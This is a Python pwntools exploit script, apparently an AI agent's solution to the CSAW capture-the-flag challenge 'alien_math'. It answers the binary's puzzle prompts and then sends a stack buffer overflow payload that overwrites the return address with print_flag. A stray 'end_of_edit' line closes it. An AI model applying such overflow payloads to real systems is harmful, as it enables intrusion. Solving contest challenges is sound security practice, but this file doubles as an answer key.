from pwn import *

context.binary = ELF("./alien_math", checksec=False)
elf = context.binary

target = "775940648525523229225"

def f(a_char, b_char):
    a = ord(a_char) - ord('0')
    b = ord(b_char) - ord('0')
    return (48 * a + 11 * b - 4) % 10

def recover_original(target_str):
    s = list(target_str)
    for i in range(len(s) - 2, -1, -1):
        wanted = ord(s[i + 1]) - ord('0')
        ai = s[i]
        for d in "0123456789":
            if (ord(d) - ord('0') + f(ai, chr(ord(ai) + i))) % 10 == wanted:
                s[i + 1] = d
                break
        else:
            raise ValueError("no digit found")
    return "".join(s)

second = recover_original(target)

p = remote("pwn.chal.csaw.io", 5000)
p.recvuntil(b"What is the square root of zopnol?")
p.sendline(b"1804289383")
p.recvuntil(b"How many tewgrunbs are in a qorbnorbf?")
p.sendline(second.encode())

payload = b"A" * 16 + p64(elf.symbols["print_flag"])
p.recvuntil(b"What is the airspeed velocity of an unladen swallow?")
p.sendline(payload)

print(p.recvall(timeout=3).decode("latin-1"))
end_of_edit
